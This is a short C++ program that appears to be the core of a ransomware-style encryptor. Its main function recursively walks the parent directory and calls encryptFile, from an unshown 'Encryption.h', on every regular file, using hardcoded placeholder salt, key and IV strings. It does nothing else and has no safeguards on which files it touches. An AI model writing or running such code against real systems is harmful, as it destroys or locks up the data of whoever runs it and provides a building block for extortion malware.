#include <iostream>
#include <filesystem>

#include "Encryption.h"

int main() {
    for (const auto& dirEntry : std::filesystem::recursive_directory_iterator("../")) {
        if(dirEntry.is_regular_file())
            encryptFile(dirEntry, "salt", "key", "iv");
    }
    return 0;
}
